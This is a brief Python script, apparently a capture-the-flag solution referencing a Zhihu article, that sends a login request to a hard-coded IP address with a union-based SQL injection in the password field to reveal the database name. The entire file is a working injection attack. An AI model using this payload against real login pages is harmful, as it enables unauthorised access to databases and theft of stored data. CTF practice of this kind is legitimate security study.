# https://zhuanlan.zhihu.com/p/74907340

import requests
url = 'http://140.115.59.7:12004/login.php'

username = "1"
password = "-1' union select -1,-2,database() -- -"

values = {
    'ctf_username': username,
    'ctf_password': password,
    }

r = requests.post(url, data=values)
print(r.content)